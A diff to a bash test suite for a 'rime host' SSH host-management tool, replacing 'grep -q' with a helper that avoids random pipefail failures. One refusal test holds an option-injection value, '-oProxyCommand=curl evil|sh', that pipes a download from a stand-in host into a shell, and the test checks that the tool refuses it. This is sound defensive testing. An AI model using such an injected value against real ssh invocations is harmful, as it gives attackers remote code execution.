@@ -46,6 +46,10 @@
 #  Run from anywhere: ./tests/test-rime-host.sh
 # ─────────────────────────────────────────────────────────────────────────────
 set -uo pipefail
+# grep -q exits at its first match; under pipefail a producer that is still
+# writing then fails (EPIPE, or 141 from SIGPIPE) and so does the pipeline,
+# at random. pipe_has reads its input to the end.
+pipe_has() { grep "$@" >/dev/null; }
 # `set +e` for the same reason as every other suite here: this one COUNTS
 # failures instead of aborting, and many assertions run commands that exit
 # non-zero on purpose. GitHub Actions invokes a script as `bash -e {0}`, and
@@ -215,7 +219,7 @@ fi
 # GitHub runner with a hyperv_drm display and no accelerator at all. The
 # assertion was "works on my machine" in one line.
 for field in rime_version cpus probed_at podman agentd ai; do
-    if printf '%s' "$out" | grep -q "\"$field\""; then
+    if printf '%s' "$out" | pipe_has "\"$field\""; then
         ok "describe --json always carries $field"
     else
         bad "describe --json always carries $field" "absent from $out"
@@ -237,7 +241,7 @@ else
     bad "gpus and accel are omitted when empty" "$out"
 fi
 
-if rime host describe | grep -q "Rime"; then
+if rime host describe | pipe_has "Rime"; then
     ok "describe without --json is human-readable"
 else
     bad "describe without --json is human-readable" "$(rime host describe)"
@@ -249,33 +253,33 @@ resetssh
 SSH_SCENARIO=describe rime host add katana --note "build box" >/dev/null
 argv=$(lastargv)
 
-if printf '%s\n' "$argv" | grep -qx "BatchMode=yes"; then
+if printf '%s\n' "$argv" | pipe_has -x "BatchMode=yes"; then
     ok "BatchMode=yes is always passed, so a dispatch cannot block on a prompt"
 else
     bad "BatchMode=yes is always passed" "$(printf '%s' "$argv" | tr '\n' ' ')"
 fi
 
-if printf '%s\n' "$argv" | grep -q "^ConnectTimeout="; then
+if printf '%s\n' "$argv" | pipe_has "^ConnectTimeout="; then
     ok "a connect timeout is always passed, so an absent host fails fast"
 else
     bad "a connect timeout is always passed" "$(printf '%s' "$argv" | tr '\n' ' ')"
 fi
 
 # An ABSENCE assertion. `accept-new` would silently pin an unverified key.
-if printf '%s\n' "$argv" | grep -q "StrictHostKeyChecking"; then
+if printf '%s\n' "$argv" | pipe_has "StrictHostKeyChecking"; then
     bad "host-key checking is never weakened" "argv contains StrictHostKeyChecking"
 else
     ok "host-key checking is never weakened (no StrictHostKeyChecking at all)"
 fi
 
 # `--` must come immediately before the destination.
-if printf '%s\n' "$argv" | grep -A1 -x -- "--" | tail -1 | grep -qx "katana"; then
+if printf '%s\n' "$argv" | grep -A1 -x -- "--" | tail -1 | pipe_has -x "katana"; then
     ok "-- precedes the destination, so it cannot be read as an option"
 else
     bad "-- precedes the destination" "$(printf '%s' "$argv" | tr '\n' ' ')"
 fi
 
-if printf '%s\n' "$argv" | grep -qx -- "-T"; then
+if printf '%s\n' "$argv" | pipe_has -x -- "-T"; then
     ok "a probe asks for no tty"
 else
     bad "a probe asks for no tty" "$(printf '%s' "$argv" | tr '\n' ' ')"
@@ -285,12 +289,12 @@ fi
 section "probing"
 resetssh
 out=$(SSH_SCENARIO=describe rime host probe katana)
-if printf '%s' "$out" | grep -q "Rime 9.9.9" && printf '%s' "$out" | grep -q "gaming"; then
+if printf '%s' "$out" | pipe_has "Rime 9.9.9" && printf '%s' "$out" | pipe_has "gaming"; then
     ok "a Rime peer's self-description is used"
 else
     bad "a Rime peer's self-description is used" "$out"
 fi
-if printf '%s' "$out" | grep -q "cuda" && printf '%s' "$out" | grep -q "ai"; then
+if printf '%s' "$out" | pipe_has "cuda" && printf '%s' "$out" | pipe_has "ai"; then
     ok "the peer's accelerators and services are reported"
 else
     bad "the peer's accelerators and services are reported" "$out"
@@ -298,12 +302,12 @@ fi
 
 resetssh
 out=$(SSH_SCENARIO=shell rime host probe katana)
-if printf '%s' "$out" | grep -q "Fedora Linux 43"; then
+if printf '%s' "$out" | pipe_has "Fedora Linux 43"; then
     ok "a host with no rime falls back to the portable shell probe"
 else
     bad "a host with no rime falls back to the portable shell probe" "$out"
 fi
-if printf '%s' "$out" | grep -q "8 cpu"; then
+if printf '%s' "$out" | pipe_has "8 cpu"; then
     ok "the fallback still reports what it could read"
 else
     bad "the fallback still reports what it could read" "$out"
@@ -317,7 +321,7 @@ fi
 
 resetssh
 out=$(SSH_SCENARIO=dead rime host probe katana)
-if printf '%s' "$out" | grep -qi "unreachable"; then
+if printf '%s' "$out" | pipe_has -i "unreachable"; then
     ok "an unreachable host is reported, not crashed on"
 else
     bad "an unreachable host is reported, not crashed on" "$out"
@@ -331,7 +335,7 @@ fi
 # A failed probe must not destroy what the last successful one learned. The
 # host being off the LAN is the normal case on a laptop, and forgetting its
 # capabilities every time would make the cache useless exactly when it matters.
-if rime host show katana | grep -q "8 cpu"; then
+if rime host show katana | pipe_has "8 cpu"; then
     ok "a failed probe leaves the last known-good result in place"
 else
     bad "a failed probe leaves the last known-good result in place" "$(rime host show katana)"
@@ -388,7 +392,7 @@ fi
 # -t must reach ssh for an interactive session.
 resetssh
 rime host run katana -t -- top >/dev/null 2>&1
-if lastargv | grep -qx -- "-t"; then
+if lastargv | pipe_has -x -- "-t"; then
     ok "--tty asks ssh for a terminal"
 else
     bad "--tty asks ssh for a terminal" "$(lastargv | tr '\n' ' ')"
@@ -407,7 +411,7 @@ fi
 section "refusals"
 resetssh
 out=$(rime host add -- --ssh "-oProxyCommand=curl evil|sh" 2>&1)
-if [ "$?" -ne 0 ] || printf '%s' "$out" | grep -qi "option"; then
+if [ "$?" -ne 0 ] || printf '%s' "$out" | pipe_has -i "option"; then
     ok "an option-like ssh destination is refused"
 else
     bad "an option-like ssh destination is refused" "$out"
@@ -426,14 +430,14 @@ else
 fi
 
 out=$(rime host show nosuchhost 2>&1)
-if printf '%s' "$out" | grep -q "katana"; then
+if printf '%s' "$out" | pipe_has "katana"; then
     ok "an unknown host names the ones that do exist"
 else
     bad "an unknown host names the ones that do exist" "$out"
 fi
 
 out=$(rime host probe katana --all 2>&1)
-if [ "$?" -ne 0 ] && printf '%s' "$out" | grep -qi "not both"; then
+if [ "$?" -ne 0 ] && printf '%s' "$out" | pipe_has -i "not both"; then
     ok "a name and --all together is refused rather than guessed at"
 else
     bad "a name and --all together is refused" "$out"
@@ -450,7 +454,7 @@ check_refusal() {
     local out; out=$(rime host list 2>&1)
     local rc=$?
     cp "$REG.bak" "$REG"
-    if [ "$rc" -ne 0 ] && printf '%s' "$out" | grep -q "$want"; then
+    if [ "$rc" -ne 0 ] && printf '%s' "$out" | pipe_has "$want"; then
         ok "$label"
     else
         bad "$label" "rc=$rc out=$out"
@@ -500,7 +504,7 @@ cp "$REG.bak" "$REG"
 missing=
 [ "$rc" -ne 0 ] || missing="$missing rc=$rc"
 for part in 'version 99' 'reads version [0-9]+' 'rollback' 'Boot the newer deployment'; do
-    printf '%s' "$out" | grep -qE "$part" || missing="$missing [$part]"
+    printf '%s' "$out" | pipe_has -E "$part" || missing="$missing [$part]"
 done
 if [ -z "$missing" ]; then
     ok "a registry from a newer rime is refused, with both versions and the remedy"
@@ -531,12 +535,12 @@ fi
 
 EMPTY=$WORK/empty
 out=$(XDG_CONFIG_HOME=$EMPTY XDG_STATE_HOME=$EMPTY rime host list)
-if [ "$?" = "0" ] && printf '%s' "$out" | grep -qi "no trusted devices"; then
+if [ "$?" = "0" ] && printf '%s' "$out" | pipe_has -i "no trusted devices"; then
     ok "no registry at all is an empty list, not an error"
 else
     bad "no registry at all is an empty list, not an error" "$out"
 fi
-if printf '%s' "$out" | grep -q "rime host add"; then
+if printf '%s' "$out" | pipe_has "rime host add"; then
     ok "the empty state says how to add a device"
 else
     bad "the empty state says how to add a device" "$out"
@@ -544,7 +548,7 @@ fi
 
 # An unprobed host must not read as capable.
 out=$(rime host show offline)
-if printf '%s' "$out" | grep -qi "not probed"; then
+if printf '%s' "$out" | pipe_has -i "not probed"; then
     ok "an unprobed host says so rather than looking capable"
 else
     bad "an unprobed host says so rather than looking capable" "$out"
